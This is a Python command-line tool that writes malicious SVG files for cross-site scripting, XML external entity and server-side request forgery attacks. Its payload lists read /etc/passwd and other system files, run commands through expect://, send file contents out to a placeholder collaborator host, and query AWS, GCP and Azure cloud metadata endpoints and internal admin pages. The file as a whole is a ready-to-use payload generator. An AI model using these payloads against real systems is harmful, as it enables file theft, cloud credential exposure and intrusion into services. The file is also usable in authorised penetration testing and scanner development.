#!/usr/bin/env python3
"""SVG XXE Generator -- produce malicious SVG payloads for XSS, XXE, SSRF."""
import argparse, json, os, sys, time, xml.etree.ElementTree as ET

XSS_PAYLOADS = [
    {
        "name": "script_tag",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <script>alert(document.domain)</script>\n  <rect width="200" height="100" fill="red"/>\n</svg>',
    },
    {
        "name": "onload_event",
        "svg": '<?xml version="1.0" standalone="no"?>\n<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)" version="1.1">\n  <circle cx="50" cy="50" r="40" fill="blue"/>\n</svg>',
    },
    {
        "name": "svg_onbegin",
        "svg": '<?xml version="1.0" standalone="no"?>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <set attributeName="fill" to="red" begin="1s" onbegin="alert(document.domain)"/>\n  <rect width="200" height="100"/>\n</svg>',
    },
    {
        "name": "foreignobject_xss",
        "svg": '<?xml version="1.0" standalone="no"?>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <foreignObject width="400" height="200">\n    <body xmlns="http://www.w3.org/1999/xhtml">\n      <script>alert(document.cookie)</script>\n    </body>\n  </foreignObject>\n</svg>',
    },
    {
        "name": "animate_xss",
        "svg": '<?xml version="1.0" standalone="no"?>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <animate attributeName="x" values="0;100" begin="0s" dur="1s" onbegin="alert(1)" onend="alert(1)" repeatCount="1"/>\n  <rect width="100" height="100"/>\n</svg>',
    },
    {
        "name": "svg_set_xss",
        "svg": '<?xml version="1.0" standalone="no"?>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <set attributeName="fill" to="red" begin="0s" onbegin="alert(1)"/>\n  <rect width="100" height="100"/>\n</svg>',
    },
]

XXE_PAYLOADS = [
    {
        "name": "xxe_etc_passwd",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <text x="10" y="20">&xxe;</text>\n</svg>',
    },
    {
        "name": "xxe_etc_hostname",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <text x="10" y="20" font-size="12">&xxe;</text>\n</svg>',
    },
    {
        "name": "xxe_windows_hosts",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <text x="10" y="20">&xxe;</text>\n</svg>',
    },
    {
        "name": "xxe_php_expect",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM "expect://id">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <text x="10" y="20">&xxe;</text>\n</svg>',
    },
    {
        "name": "xxe_oob_dtd",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY % payload SYSTEM "file:///etc/hostname">\n  <!ENTITY % remote SYSTEM "http://COLLABORATOR_SERVER/oob.dtd">\n  %remote;\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <text x="10" y="20">OOB XXE test</text>\n</svg>',
    },
    {
        "name": "xxe_param_entity",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY % file SYSTEM "file:///etc/passwd">\n  <!ENTITY % eval "<!ENTITY exfil SYSTEM \'http://COLLABORATOR_SERVER/?x=%file;\'>">\n  %eval;\n  %exfil;\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <rect width="200" height="100"/>\n</svg>',
    },
]

SSRF_PAYLOADS = [
    {
        "name": "ssrf_metadata_aws",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <text x="10" y="20" font-size="12">&ssrf;</text>\n</svg>',
    },
    {
        "name": "ssrf_metadata_gcp",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY ssrf SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <text x="10" y="20">&ssrf;</text>\n</svg>',
    },
    {
        "name": "ssrf_metadata_azure",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY ssrf SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <text x="10" y="20">&ssrf;</text>\n</svg>',
    },
    {
        "name": "ssrf_internal_scan",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY ssrf SYSTEM "http://127.0.0.1:8080/">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <text x="10" y="20">&ssrf;</text>\n</svg>',
    },
    {
        "name": "ssrf_internal_admin",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY ssrf SYSTEM "http://localhost/admin">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <text x="10" y="20">&ssrf;</text>\n</svg>',
    },
    {
        "name": "ssrf_collaborator",
        "svg": '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY ssrf SYSTEM "http://COLLABORATOR_SERVER/ssrf_test">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n  <text x="10" y="20">&ssrf;</text>\n</svg>',
    },
]

PAYLOAD_REGISTRY = {
    "xss": XSS_PAYLOADS,
    "xxe": XXE_PAYLOADS,
    "ssrf": SSRF_PAYLOADS,
}


def write_svg(output_dir, name, content):
    os.makedirs(output_dir, exist_ok=True)
    safe_name = name.replace("/", "_").replace(" ", "_")
    filepath = os.path.join(output_dir, f"{safe_name}.svg")
    with open(filepath, "w") as f:
        f.write(content)
    return filepath


def validate_svg(filepath):
    try:
        tree = ET.parse(filepath)
        root = tree.getroot()
        return True, str(root.tag)
    except Exception as e:
        return False, str(e)


def main():
    parser = argparse.ArgumentParser(description="SVG XXE Generator -- malicious SVG payload factory")
    parser.add_argument("--attack-type", required=True, choices=["xss", "xxe", "ssrf", "all"],
                        help="Type of SVG payload to generate")
    parser.add_argument("--output-dir", default="svg_payloads", help="Output directory for SVG files")
    parser.add_argument("--collaborator", default="COLLABORATOR_SERVER",
                        help="Collaborator server URL for OOB payloads")
    parser.add_argument("--context", default="", help="Target context / scope description")
    parser.add_argument("--dry-run", action="store_true", help="Print payloads without writing files")
    parser.add_argument("--output", default="svg_findings.jsonl", help="JSONL output file")
    args = parser.parse_args()

    attack_types = ["xss", "xxe", "ssrf"] if args.attack_type == "all" else [args.attack_type]

    print(f"[*] SVG XXE Generator", file=sys.stderr)
    print(f"[*] Attack type(s): {attack_types}", file=sys.stderr)
    print(f"[*] Output dir: {args.output_dir}", file=sys.stderr)
    if args.collaborator != "COLLABORATOR_SERVER":
        print(f"[*] Collaborator: {args.collaborator}", file=sys.stderr)
    if args.context:
        print(f"[*] Context: {args.context}", file=sys.stderr)
    if args.dry_run:
        print(f"[*] DRY RUN -- files will not be written", file=sys.stderr)
    print(f"[*] Findings output: {args.output}", file=sys.stderr)

    all_findings = []
    total_generated = 0

    with open(args.output, "w") as findings_file:
        for atype in attack_types:
            payloads = PAYLOAD_REGISTRY[atype]
            print(f"\n[*] Generating {len(payloads)} {atype.upper()} payloads...", file=sys.stderr)

            for p in payloads:
                svg_content = p["svg"].replace("COLLABORATOR_SERVER", args.collaborator)

                if args.dry_run:
                    filepath = os.path.join(args.output_dir, f"{atype}_{p['name']}.svg")
                else:
                    filepath = write_svg(args.output_dir, f"{atype}_{p['name']}", svg_content)

                entry = {
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    "attack_type": atype,
                    "payload_name": p["name"],
                    "file_path": filepath,
                    "file_size": len(svg_content),
                    "preview": svg_content[:120].replace("\n", "\\n"),
                }

                if not args.dry_run:
                    valid, info = validate_svg(filepath)
                    entry["valid_xml"] = valid
                    entry["xml_root"] = info if valid else str(info)
                else:
                    entry["valid_xml"] = None

                all_findings.append(entry)
                findings_file.write(json.dumps(entry) + "\n")
                findings_file.flush()
                print(f"    [{atype}] {p['name']:30s} -> {filepath}", file=sys.stderr)
                total_generated += 1

    print(f"\n[*] {total_generated} SVG payloads generated", file=sys.stderr)
    if not args.dry_run:
        print(f"[*] Files written to: {os.path.abspath(args.output_dir)}", file=sys.stderr)
    print(f"[*] Findings manifest: {args.output}", file=sys.stderr)


if __name__ == "__main__":
    main()
